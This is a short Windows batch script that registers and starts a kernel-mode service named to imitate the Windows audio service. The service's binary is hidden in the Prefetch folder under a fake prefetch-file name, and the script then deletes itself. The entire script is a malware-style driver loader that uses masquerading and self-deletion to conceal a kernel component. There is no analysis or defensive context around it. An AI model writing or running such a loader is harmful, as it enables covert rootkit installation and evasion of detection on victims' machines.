@echo off
cd %~dp0
sc create AudioEndpointBuilder_3 binpath=C:\Windows\Prefetch\SVCHOST.EXE-D57C935C.pf type=kernel
sc start AudioEndpointBuilder_3
del "%~f0"



